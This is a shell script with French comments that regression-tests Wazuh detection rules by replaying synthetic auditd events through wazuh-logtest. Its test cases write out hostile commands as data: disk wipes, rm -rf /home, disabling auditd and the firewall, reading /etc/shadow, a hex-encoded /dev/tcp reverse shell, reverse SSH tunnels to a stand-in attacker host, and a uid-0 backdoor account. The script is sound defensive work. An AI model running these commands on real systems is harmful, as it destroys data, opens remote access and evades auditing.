#!/bin/sh
# Rejeu de regression des regles de detection SOC-AI (wazuh-logtest).
#
# Pourquoi ce script : la moitie des regles de niveau >= 12 decrit une action
# destructive (wipe de disque, rm -rf /home, destruction de snapshots, arret de
# l'audit). On ne peut pas les valider en les executant sur debian-vm. On rejoue
# donc des evenements auditd de synthese contre le moteur de regles du manager.
#
# Les cas NON destructifs sont valides EN PLUS sur l'agent reel (cf.
# wazuh/DETECTION-REVIEW.md) : ce script ne remplace pas le test bout-en-bout,
# il couvre ce que le test bout-en-bout ne peut pas faire et sert de filet de
# non-regression quand on edite une regex.
#
# Usage :  ./scripts/test-detection-rules.sh [nom_conteneur_manager]
#
# DEUX PIEGES, tous deux payes en heures de debogage :
#  1. wazuh-logtest ecrit son resultat sur STDERR. Un `2>/dev/null` fait
#     silencieusement echouer 100 % des cas, y compris les controles negatifs -
#     ce qui ressemble a "toutes mes regles sont cassees" et ne l'est pas.
#  2. wazuh-logtest lit UNE LIGNE = UN LOG. En production le logcollector agrege
#     SYSCALL + EXECVE + CWD + PATH + PROCTITLE en un seul evenement multiligne.
#     On concatene donc SYSCALL et EXECVE sur une ligne unique. C'est fidele pour
#     toutes les regles testees ici, qui ancrent leurs motifs a l'interieur de la
#     ligne EXECVE - mais une regle qui voudrait correler DEUX lignes ne peut pas
#     etre validee par ce script.
set -u
CT="${1:-wazuh-wazuh.manager-1}"
ok=0; ko=0

# $1 description  $2 rule_id attendu  $3 exe (comm deduit)  $4 arguments EXECVE
audit_case() {
  desc="$1"; want="$2"; exe="$3"; args="$4"
  comm=$(basename "$exe")
  log="type=SYSCALL msg=audit(1785132000.100:99001): arch=c000003e syscall=59 success=yes exit=0 items=3 ppid=100 pid=101 auid=1001 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm=\"$comm\" exe=\"$exe\" subj=unconfined key=\"audit-wazuh-c\" type=EXECVE msg=audit(1785132000.100:99001): $args"
  check "$desc" "$want" "$log"
}

# $1 description  $2 rule_id attendu  $3 ligne de log brute
raw_case() { check "$1" "$2" "$3"; }

check() {
  desc="$1"; want="$2"; log="$3"
  out=$(printf '%s\n' "$log" | docker exec -i "$CT" /var/ossec/bin/wazuh-logtest 2>&1 \
        | sed -n '/Phase 3/,$p')
  got=$(echo "$out" | grep -m1 -E "^[[:space:]]+id: '"    | sed "s/.*id: '\([0-9]*\)'.*/\1/")
  lvl=$(echo "$out" | grep -m1 -E "^[[:space:]]+level: '" | sed "s/.*level: '\([0-9]*\)'.*/\1/")
  if [ "$got" = "$want" ]; then
    ok=$((ok+1)); echo "OK   $desc -> $got (niv $lvl)"
  else
    ko=$((ko+1)); echo "FAIL $desc -> attendu $want, obtenu ${got:-aucune} (niv ${lvl:-0})"
  fi
}

echo "== Destruction de donnees / de support (T1485, T1561) =="
audit_case "100680 hdparm --security-erase" 100680 /usr/sbin/hdparm 'argc=4 a0="hdparm" a1="--user-master" a2="u" a3="--security-erase"'
audit_case "100680 nvme format"             100680 /usr/sbin/nvme   'argc=3 a0="nvme" a1="format" a2="/dev/nvme0n1"'
audit_case "100680 sgdisk --zap-all"        100680 /usr/sbin/sgdisk 'argc=3 a0="sgdisk" a1="--zap-all" a2="/dev/sda"'
audit_case "100680 cryptsetup luksErase"    100680 /usr/sbin/cryptsetup 'argc=3 a0="cryptsetup" a1="luksErase" a2="/dev/sda2"'
audit_case "100680 dd of=/dev/sda"          100680 /usr/bin/dd     'argc=3 a0="dd" a1="if=/dev/zero" a2="of=/dev/sda"'
audit_case "100680 wipefs -a"               100680 /usr/sbin/wipefs 'argc=3 a0="wipefs" a1="-a" a2="/dev/sdb"'
audit_case "100681 rm -rf /home"            100681 /usr/bin/rm     'argc=3 a0="rm" a1="-rf" a2="/home"'

echo "== Inhibition de la restauration (T1490) =="
audit_case "100673 zfs destroy"             100673 /usr/sbin/zfs   'argc=3 a0="zfs" a1="destroy" a2="tank/backup"'
audit_case "100674 systemctl stop restic"   100674 /usr/bin/systemctl 'argc=3 a0="systemctl" a1="stop" a2="restic-backup.timer"'

echo "== Defense evasion (T1562.001 / T1562.004) =="
audit_case "100654 systemctl stop auditd"   100654 /usr/bin/systemctl 'argc=3 a0="systemctl" a1="stop" a2="auditd"'
# Ordre inverse + argv reecrit par le noyau (script a shebang) : les deux pieges
# qui rendaient l'ancienne version de 100654 contournable.
audit_case "100654 service auditd stop"     100654 /usr/bin/dash   'argc=4 a0="/bin/sh" a1="/usr/sbin/service" a2="auditd" a3="stop"'
audit_case "100654 pkill -9 auditd"         100654 /usr/bin/pkill  'argc=3 a0="pkill" a1="-9" a2="auditd"'
audit_case "100654 auditctl -D"             100654 /usr/sbin/auditctl 'argc=2 a0="auditctl" a1="-D"'
audit_case "100654 auditctl -e 0"           100654 /usr/sbin/auditctl 'argc=3 a0="auditctl" a1="-e" a2="0"'
audit_case "100654 setenforce 0"            100654 /usr/sbin/setenforce 'argc=2 a0="setenforce" a1="0"'
audit_case "100645 nft flush ruleset"       100645 /usr/sbin/nft   'argc=3 a0="nft" a1="flush" a2="ruleset"'
audit_case "100645 ufw disable"             100645 /usr/bin/python3 'argc=3 a0="/usr/bin/python3" a1="/usr/sbin/ufw" a2="disable"'

echo "== Execution / privesc =="
audit_case "100656 chmod u+s"               100656 /usr/bin/chmod  'argc=3 a0="chmod" a1="u+s" a2="/tmp/x"'
audit_case "100650 /dev/tcp (hex)"          100650 /usr/bin/bash   'argc=3 a0="bash" a1="-c" a2="6261736820692F6465762F7463702F312E322E332E342F34343434"'
audit_case "100653 sh -c cat /etc/shadow"   100653 /usr/bin/dash   'argc=3 a0="sh" a1="-c" a2="cat /etc/shadow"'
audit_case "100660 CVE dans le binaire"     100660 /usr/bin/python3 'argc=2 a0="python3" a1="CVE-2021-4034.py"'

echo "== Post-exploitation (pack 100760+) =="
# Cas non rejouables sur debian-vm : nmap/masscan et Docker n'y sont pas
# installes. Le reste du pack est valide en direct sur l'agent.
audit_case "100769 nmap"                    100769 /usr/bin/nmap   'argc=4 a0="nmap" a1="-sS" a2="-p-" a3="10.0.0.0/24"'
audit_case "100769 masscan"                 100769 /usr/bin/masscan 'argc=3 a0="masscan" a1="-p80" a2="0.0.0.0/0"'
audit_case "100766 docker --privileged"     100766 /usr/bin/docker 'argc=5 a0="docker" a1="run" a2="--privileged" a3="-it" a4="alpine"'
audit_case "100766 nsenter -t 1"            100766 /usr/bin/nsenter 'argc=5 a0="nsenter" a1="-t" a2="1" a3="-m" a4="/bin/sh"'
audit_case "100764 ssh -R (reverse tunnel)" 100764 /usr/bin/ssh    'argc=4 a0="ssh" a1="-R" a2="9999:localhost:22" a3="attacker@1.2.3.4"'
audit_case "100764 chisel client"           100764 /usr/local/bin/chisel 'argc=3 a0="chisel" a1="client" a2="1.2.3.4:8080"'
audit_case "100762 useradd -o -u 0"         100762 /usr/sbin/useradd 'argc=5 a0="useradd" a1="-o" a2="-u" a3="0" a4="backdoor"'
audit_case "100761 usermod -aG sudo"        100761 /usr/sbin/usermod 'argc=4 a0="usermod" a1="-aG" a2="sudo" a3="pwned"'
audit_case "100768 setcap cap_setuid"       100768 /usr/sbin/setcap 'argc=3 a0="setcap" a1="cap_setuid+ep" a2="/usr/bin/python3"'
audit_case "100763 history -c (hex)"        100763 /usr/bin/bash   'argc=3 a0="bash" a1="-c" a2="686973746F7279202D63"'
# Controle negatif du pack : un ssh normal ne doit pas passer pour un tunnel.
audit_case "NEG ssh normal"                 80792  /usr/bin/ssh    'argc=2 a0="ssh" a1="serveur.interne"'

echo "== Fork bomb (messages noyau/shell, ligne unique) =="
raw_case "100626 cgroup pids controller" 100626 "Jul 27 06:10:00 debian kernel: cgroup: fork rejected by pids controller in /user.slice/user-1001.slice"
raw_case "100626 forme shell"            100626 "Jul 27 06:10:00 debian bash[123]: fork: retry: Resource temporarily unavailable"

echo "== Auto-surveillance du capteur =="
raw_case "100801 audit desactive"  100801 "ossec: output: audit-status: audit_enabled=0 audit_rules=21"
raw_case "100802 regles purgees"   100802 "ossec: output: audit-status: audit_enabled=1 audit_rules=0"
raw_case "100800 etat nominal"     100800 "ossec: output: audit-status: audit_enabled=1 audit_rules=21"

echo "== Controles negatifs : doivent retomber en 80792 (niveau 3) =="
audit_case "NEG rm -rf /tmp/build"          80792 /usr/bin/rm     'argc=3 a0="rm" a1="-rf" a2="/tmp/build"'
audit_case "NEG systemctl restart apache2"  80792 /usr/bin/systemctl 'argc=3 a0="systemctl" a1="restart" a2="apache2"'
audit_case "NEG dd of=/home/u/img.iso"      80792 /usr/bin/dd     'argc=3 a0="dd" a1="if=/dev/zero" a2="of=/home/u/img.iso"'
audit_case "NEG apt-get install nginx"      80792 /usr/bin/apt-get 'argc=3 a0="apt-get" a1="install" a2="nginx"'
audit_case "NEG chmod 755"                  80792 /usr/bin/chmod  'argc=3 a0="chmod" a1="755" a2="/usr/local/bin/x"'
audit_case "NEG borg prune (retention)"     80792 /usr/bin/borg   'argc=3 a0="borg" a1="prune" a2="--keep-daily=7"'

echo
echo "Resultat : $ok OK, $ko FAIL"
[ "$ko" -eq 0 ]
